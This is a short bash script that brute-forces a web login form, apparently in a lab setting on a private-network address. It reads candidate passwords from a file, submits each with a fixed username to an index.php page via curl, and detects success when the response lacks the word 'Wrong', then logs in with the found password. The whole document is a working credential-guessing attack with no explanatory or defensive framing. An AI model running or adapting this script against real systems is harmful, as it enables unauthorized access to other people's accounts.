
IP="192.168.3.151"

password_list=$(cat "passwords.txt")
for password in $password_list; do
	echo "Testing ${password}"
	if [[ $(curl -s "192.168.3.151/index.php?username=furkan.paligu&password=${password}" | grep -oE "Wrong") == "" ]]
	then
		correctPassword=$password
		echo "${password} is the password!"
		break
	fi
done

curl "192.168.3.151/index.php?username=furkan.paligu&password=${correctPassword}"
	
